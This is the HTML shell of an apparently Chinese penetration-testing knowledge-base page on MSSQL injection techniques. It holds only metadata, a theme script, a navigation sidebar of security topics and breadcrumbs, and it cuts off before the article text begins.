<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-渗透测试/WEB漏洞/SQL注入/MSSQL/各种注入手法" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">各种注入手法 | d4m1ts 知识库</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://blog.gm7.org/docs/渗透测试/WEB漏洞/SQL注入/MSSQL/各种注入手法"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="各种注入手法 | d4m1ts 知识库"><meta data-rh="true" name="description" content="前情提要"><meta data-rh="true" property="og:description" content="前情提要"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://blog.gm7.org/docs/渗透测试/WEB漏洞/SQL注入/MSSQL/各种注入手法"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/渗透测试/WEB漏洞/SQL注入/MSSQL/各种注入手法" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/渗透测试/WEB漏洞/SQL注入/MSSQL/各种注入手法" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://0LMFVYF6KV-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"渗透测试","item":"https://blog.gm7.org/docs/渗透测试/"},{"@type":"ListItem","position":2,"name":"WEB漏洞","item":"https://blog.gm7.org/docs/渗透测试/WEB漏洞/"},{"@type":"ListItem","position":3,"name":"SQL注入","item":"https://blog.gm7.org/docs/渗透测试/WEB漏洞/SQL注入/"},{"@type":"ListItem","position":4,"name":"MSSQL","item":"https://blog.gm7.org/docs/category/mssql"},{"@type":"ListItem","position":5,"name":"各种注入手法","item":"https://blog.gm7.org/docs/渗透测试/WEB漏洞/SQL注入/MSSQL/各种注入手法"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="d4m1ts 知识库 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="d4m1ts 知识库 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="d4m1ts 知识库" href="/opensearch.xml"><link rel="stylesheet" href="/assets/css/styles.933499b4.css">
<script src="/assets/js/runtime~main.fa890071.js" defer="defer"></script>
<script src="/assets/js/main.ef8e3068.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate"></b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/intro">知识库</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="切换浅色/暗黑模式（当前为system mode）"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/渗透测试/">渗透测试</a><button aria-label="折叠侧边栏分类 &#x27;渗透测试&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/渗透测试/信息收集/资产收集/主域名收集/">信息收集</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/渗透测试/WEB漏洞/">WEB漏洞</a><button aria-label="折叠侧边栏分类 &#x27;WEB漏洞&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/渗透测试/WEB漏洞/SQL注入/">SQL注入</a><button aria-label="折叠侧边栏分类 &#x27;SQL注入&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SQL注入/注入点检测/">注入点检测</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SQL注入/数据库识别/">数据库识别</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-4 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/mysql">MySQL</a><button aria-label="展开侧边栏分类 &#x27;MySQL&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-4 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/category/mssql">MSSQL</a><button aria-label="折叠侧边栏分类 &#x27;MSSQL&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-5 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SQL注入/MSSQL/常用符号:函数:语句归类">常用符号:函数:语句归类</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-5 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/渗透测试/WEB漏洞/SQL注入/MSSQL/各种注入手法">各种注入手法</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-5 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SQL注入/MSSQL/绕过技巧">绕过技巧</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-5 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SQL注入/MSSQL/补充">补充</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-4 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/oracle">Oracle</a><button aria-label="展开侧边栏分类 &#x27;Oracle&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-4 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/SQL注入/PostgreSQL/">PostgreSQL</a><button aria-label="展开侧边栏分类 &#x27;PostgreSQL&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SQL注入/Access/">Access</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SQL注入/万能密码/">万能密码</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-4 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/工具">工具</a><button aria-label="展开侧边栏分类 &#x27;工具&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/XSS/">XSS</a><button aria-label="展开侧边栏分类 &#x27;XSS&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/csrf">CSRF</a><button aria-label="展开侧边栏分类 &#x27;CSRF&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/SSRF/">SSRF</a><button aria-label="展开侧边栏分类 &#x27;SSRF&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/未授权访问">未授权访问</a><button aria-label="展开侧边栏分类 &#x27;未授权访问&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/条件竞争/">条件竞争</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/任意文件下载:读取/">任意文件下载/读取</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/文件上传/">文件上传</a><button aria-label="展开侧边栏分类 &#x27;文件上传&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/文件包含漏洞/">文件包含漏洞</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/LDAP注入/">LDAP注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/XXE/">XXE</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/命令执行/">命令执行</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/代码注入/">代码注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SAML测试/">SAML测试</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/JSONP数据劫持/">JSONP数据劫持</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/CORS跨域数据劫持/">CORS跨域数据劫持</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/CSV注入/">CSV注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/XSSI/">XSSI</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/XSLT/">XSLT</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/XS-Leaks/">XS-Leaks</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SSTI注入/">SSTI</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/GraphQL测试/">GraphQL安全测试</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/子域名接管/">子域名接管</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/列目录漏洞/">列目录漏洞</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/XPATH注入/">XPATH注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/越权漏洞/">越权漏洞</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/不安全的反序列化/">不安全的反序列化</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/任意URL跳转/">任意URL跳转</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/信息泄漏/">信息泄漏漏洞</a><button aria-label="展开侧边栏分类 &#x27;信息泄漏漏洞&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SMTP注入/">SMTP注入</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/逻辑漏洞/">逻辑漏洞</a><button aria-label="展开侧边栏分类 &#x27;逻辑漏洞&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/CRLF注入/">CRLF注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/web缓存投毒/">WEB缓存投毒</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/漏洞扫描工具/">漏洞扫描工具</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/思路技巧">思路技巧</a><button aria-label="展开侧边栏分类 &#x27;思路技巧&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/权限维持/">权限维持</a><button aria-label="展开侧边栏分类 &#x27;权限维持&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/小程序测试">小程序测试</a><button aria-label="展开侧边栏分类 &#x27;小程序测试&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/保护自己">保护自己</a><button aria-label="展开侧边栏分类 &#x27;保护自己&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/waf绕过">WAF绕过</a><button aria-label="展开侧边栏分类 &#x27;WAF绕过&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/攻防演练/">攻防演练</a><button aria-label="展开侧边栏分类 &#x27;攻防演练&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/社工钓鱼/">社工钓鱼</a><button aria-label="展开侧边栏分类 &#x27;社工钓鱼&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/category/cs">C2</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/category/powershell">免杀</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/category/内网基础知识">内网渗透</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/基础知识扫盲">基础知识扫盲</a><button aria-label="展开侧边栏分类 &#x27;基础知识扫盲&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/代码审计/">代码审计</a><button aria-label="展开侧边栏分类 &#x27;代码审计&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/编程开发/GO/GO基础/">编程开发</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/前置基础知识">移动安全</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/应急响应/简介/">应急响应</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/日常使用">AI</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/暂未分类/自建网盘/h5ai/">暂未分类</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/致谢">致谢</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/更新日志">更新日志</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_z5aJ"><div class="docItemContainer_c0TR"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/渗透测试/"><span>渗透测试</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/渗透测试/WEB漏洞/"><span>WEB漏洞</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/渗透测试/WEB漏洞/SQL注入/"><span>SQL注入</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/category/mssql"><span>MSSQL</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">各种注入手法</span></li></ul></nav><div class="tocCollapsible_ETCw 